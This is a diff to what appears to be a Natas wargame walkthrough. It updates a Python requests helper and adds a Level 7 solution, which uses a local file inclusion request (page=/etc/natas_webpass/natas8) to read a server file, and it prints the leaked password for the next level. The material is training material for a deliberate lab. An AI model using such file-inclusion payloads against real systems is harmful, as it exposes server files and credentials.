@@ -18,13 +18,13 @@ https://overthewire.org/wargames/natas/
 
 ## NatasX
 ```python
-def natasX(x, pwd, endpoint="", headers={}):
+def natasX(x, pwd, endpoint="", headers={}, cookies={}):
     url = f'http://natas{x}.natas.labs.overthewire.org/{endpoint}'
     username = f"natas{x}"
 
-    r = requests.get(url, auth=(username, pwd), headers=headers)
+    r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies)
 
-    print(r.text)
+    return r
  ```
 
 ## Natas0
@@ -231,6 +231,35 @@ https://overthewire.org/wargames/natas/natas7.html
 > Username: natas7
 
 > URL:      http://natas7.natas.labs.overthewire.org
+
+```python
+# print(natas.natasX(7, "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9").text)
+print(natas.natasX(7, "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9", endpoint="index.php?page=/etc/natas_webpass/natas8").text)
+```
+
+**Output**
+
+```html
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+```
+
+## Natas8
+https://overthewire.org/wargames/natas/natas8.html
+
+> Natas Level 7 → Level 8
+
+> Username: natas8
+
+> URL:      http://natas8.natas.labs.overthewire.org
 
 ```python
 ```
